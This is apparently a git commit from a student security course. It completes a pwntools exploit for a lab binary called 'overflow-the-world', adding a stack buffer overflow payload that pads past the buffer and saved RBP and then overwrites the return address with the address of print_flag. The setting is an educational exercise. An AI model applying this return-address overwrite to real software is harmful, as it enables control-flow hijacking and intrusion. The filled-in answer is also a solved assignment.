0ee1277886ad0aee8f1fac85390cbfff6b2ca535
Chanyu Kim <47536694+CKKC15@users.noreply.github.com>
2025-11-07 03:37:00 +0000

    finish part2

--- assignment-2/2-overflow-the-world/part2.py
+++ assignment-2/2-overflow-the-world/part2.py
@@ -4,11 +4,13 @@ from pwn import *
 exe = ELF("./overflow-the-world")
 
 r = process([exe.path])
-# gdb.attach(r)
 
 win = exe.symbols["print_flag"]
 #write your payload here, prompt: it should be overwrite the saved base pointer (rbp), positioning the payload right at the saved return address, then add p64(win).
 # payload = 
+payload = b'0' * 64  # Fill the buffer
+payload += b'0' * 8  # Overwrite saved RBP
+payload += p64(win)  # Overwrite return address with print_flag address
 
 r.recvuntil(b"What's your name? ")
 r.sendline(payload)
